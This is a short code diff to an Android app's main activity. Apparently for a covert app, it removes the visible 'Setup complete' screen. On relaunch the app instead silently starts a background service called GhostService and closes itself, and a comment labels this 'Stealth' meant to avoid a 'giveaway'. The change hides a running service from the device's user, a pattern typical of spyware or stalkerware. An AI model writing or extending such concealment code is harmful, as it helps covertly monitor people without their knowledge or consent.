@@ -53,8 +53,14 @@ class MainActivity : Activity() {
         rowsLayout.addView(header)
 
         if (Prefs.setupDone(this)) {
-            header.text = "Setup complete"
-            setContentView(scroll)
+            // Stealth: setup already done — relaunching the app must show NO
+            // UI (a "Setup complete" page is a giveaway). Silently make sure
+            // the service is running and get out of the way immediately.
+            try {
+                startForegroundService(Intent(this, GhostService::class.java))
+            } catch (_: Exception) {
+            }
+            finish()
             return
         }
 
